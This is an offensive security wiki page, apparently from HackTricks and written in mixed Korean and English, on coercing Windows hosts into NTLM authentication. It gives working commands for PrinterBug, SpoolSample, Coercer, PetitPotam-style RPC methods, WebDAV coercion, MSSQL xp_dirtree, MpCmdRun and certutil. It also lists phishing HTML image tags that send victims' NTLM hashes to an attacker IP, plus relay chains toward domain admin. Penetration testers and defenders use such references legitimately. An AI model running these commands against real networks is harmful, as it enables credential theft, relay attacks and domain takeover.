# Force NTLM Privileged Authentication

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers)는 3rd party dependencies를 피하기 위해 MIDL compiler를 사용해 C#으로 작성된 **remote authentication triggers**의 **collection**입니다.

## Spooler Service Abuse

_**Print Spooler**_ 서비스가 **enabled**되어 있으면, 이미 알려진 AD credentials를 사용해 Domain Controller의 print server에 새 print jobs에 대한 **update**를 **request**하고, 단지 일부 system으로 **notification**을 보내라고 지시할 수 있습니다.\
printer가 임의의 systems에 notification을 보낼 때, 해당 **system에 authenticate against**해야 합니다. 따라서 attacker는 _**Print Spooler**_ 서비스가 임의의 system에 authenticate against하도록 만들 수 있으며, 이 서비스는 이 인증에서 **computer account**를 사용합니다.

내부적으로, 고전적인 **PrinterBug** primitive는 **`RpcRemoteFindFirstPrinterChangeNotificationEx`**를 **`\\PIPE\\spoolss`** 위에서 악용합니다. attacker는 먼저 printer/server handle을 열고, `pszLocalMachine`에 가짜 client name을 제공하여 target spooler가 attacker-controlled host로 **back**하는 notification channel을 생성하게 합니다. 이것이 이 효과가 direct code execution이 아니라 **outbound authentication coercion**인 이유입니다.\
spooler 자체에서 **RCE/LPE**를 찾고 있다면 [PrintNightmare](printnightmare.md)를 확인하세요. 이 페이지는 **coercion and relay**에 초점을 맞춥니다.

### Finding Windows Servers on the domain

PowerShell을 사용해 Windows boxes 목록을 가져오세요. Servers가 보통 우선순위이므로, 거기에 집중합니다:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Spooler services listening 찾기

약간 수정한 @mysmartlogin의 (Vincent Le Toux의) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket)를 사용하여 Spooler Service가 listening 중인지 확인하세요:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Linux에서도 `rpcdump.py`를 사용해 **MS-RPRN** 프로토콜을 확인할 수 있습니다:
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
Linux에서 **NetExec/CrackMapExec**로 호스트를 빠르게 테스트하려면:
```bash
nxc smb targets.txt -u user -p password -M spooler
```
스풀러 엔드포인트가 존재하는지만 확인하는 대신 **coercion surfaces**를 **enumerate**하고 싶다면, **Coercer scan mode**를 사용하세요:
```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```
이는 EPM에서 endpoint를 보는 것만으로는 print RPC interface가 등록되었다는 사실만 알려줄 뿐이기 때문에 유용합니다. 이는 현재 권한으로 모든 coercion method에 도달할 수 있거나 호스트가 사용할 수 있는 authentication flow를 내보낼 것이라는 것을 **보장하지 않습니다**.

### 서비스에게 임의의 host에 대해 authenticate하도록 요청하기

[SpoolSample from here](https://github.com/NotMedic/NetNTLMtoSilverTicket)를 컴파일할 수 있습니다.
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
또는 Linux를 사용 중이라면 [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) 또는 [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)를 사용하세요
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
With **Coercer**, spooler 인터페이스를 직접 대상으로 삼아 어떤 RPC method가 노출되어 있는지 추측할 필요를 피할 수 있습니다:
```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```
### WebClient로 SMB 대신 HTTP 강제하기

Classic PrinterBug는 보통 `\\attacker\share`로의 **SMB** 인증을 발생시키며, 이는 여전히 **capture**, **HTTP targets로 relay** 또는 **SMB signing이 없는 곳으로 relay**하는 데 유용합니다.\
하지만 현대 환경에서는 **SMB to SMB** relay가 **SMB signing** 때문에 자주 차단되므로, 운영자는 대신 **HTTP/WebDAV** 인증을 강제로 유도하는 것을 더 선호합니다.

대상에서 **WebClient** 서비스가 실행 중이라면, Windows가 **HTTP over WebDAV**를 사용하도록 만드는 형식으로 listener를 지정할 수 있습니다:
```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```
This is especially useful when chaining with **`ntlmrelayx --adcs`** or other HTTP relay targets because it avoids relying on SMB relayability on the coerced connection. The important caveat is that **WebClient must be running** on the victim for the HTTP/WebDAV variant to work.

### Combining with Unconstrained Delegation

If an attacker has already compromised a computer with [Unconstrained Delegation](unconstrained-delegation.md), the attacker could **make the printer authenticate against this computer**. Due to the unconstrained delegation, the **TGT** of the **computer account of the printer** will be **saved in** the **memory** of the computer with unconstrained delegation. As the attacker has already compromised this host, he will be able to **retrieve this ticket** and abuse it ([Pass the Ticket](pass-the-ticket.md)).

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)

### RPC UNC-path coercion matrix (interfaces/opnums that trigger outbound auth)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / SpoolSample / Coercer
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Notes: asynchronous print interface on the same spooler pipe; use Coercer to enumerate reachable methods on a given host
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (also via \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums commonly abused: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce

Note: These methods accept parameters that can carry a UNC path (e.g., `\\attacker\share`). When processed, Windows will authenticate (machine/user context) to that UNC, enabling NetNTLM capture or relay.\
For spooler abuse, **MS-RPRN opnum 65** remains the most common and best-documented primitive because the protocol specification explicitly states that the server creates a notification channel back to the client specified by `pszLocalMachine`.

### MS-EVEN: ElfrOpenBELW (opnum 9) coercion
- Interface: MS-EVEN over \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)
- Effect: the target attempts to open the supplied backup log path and authenticates to the attacker-controlled UNC.
- Practical use: coerce Tier 0 assets (DC/RODC/Citrix/etc.) to emit NetNTLM, then relay to AD CS endpoints (ESC8/ESC11 scenarios) or other privileged services.

## PrivExchange

The `PrivExchange` attack is a result of a flaw found in the **Exchange Server `PushSubscription` feature**. This feature allows the Exchange server to be forced by any domain user with a mailbox to authenticate to any client-provided host over HTTP.

By default, the **Exchange service runs as SYSTEM** and is given excessive privileges (specifically, it has **WriteDacl privileges on the domain pre-2019 Cumulative Update**). This flaw can be exploited to enable the **relaying of information to LDAP and subsequently extract the domain NTDS database**. In cases where relaying to LDAP is not possible, this flaw can still be used to relay and authenticate to other hosts within the domain. The successful exploitation of this attack grants immediate access to the Domain Admin with any authenticated domain user account.

## Inside Windows

If you are already inside the Windows machine you can force Windows to connect to a server using privileged accounts with:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
또는 이 다른 기법을 사용하세요: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

certutil.exe lolbin (Microsoft-signed binary)을 사용하여 NTLM 인증을 강제로 유도할 수 있습니다:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML 주입

### 이메일을 통해

침해하려는 머신에 로그인하는 사용자의 **email address**를 알고 있다면, 다음과 같은 **1x1 image**가 포함된 **email**을 그냥 보낼 수 있습니다:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
그리고 그가 이를 열면, 인증을 시도할 것이다.

### MitM

컴퓨터에 MitM 공격을 수행하고 그가 보게 될 페이지에 HTML을 주입할 수 있다면, 페이지에 다음과 같은 이미지를 주입해 볼 수 있다:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## NTLM 인증을 강제로 유도하고 피싱하는 다른 방법들


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## NTLMv1 크래킹

[여기](../ntlm/index.html#ntlmv1-attack)에서 NTLMv1 challenges를 캡처해 크래킹하는 방법을 볼 수 있다.\
_기억해둘 점은 NTLMv1을 크래킹하려면 Responder challenge를 "1122334455667788"로 설정해야 한다는 것이다_

## References
- [Unit 42 – Authentication Coercion Keeps Evolving](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [Microsoft – MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)

{{#include ../../banners/hacktricks-training.md}}
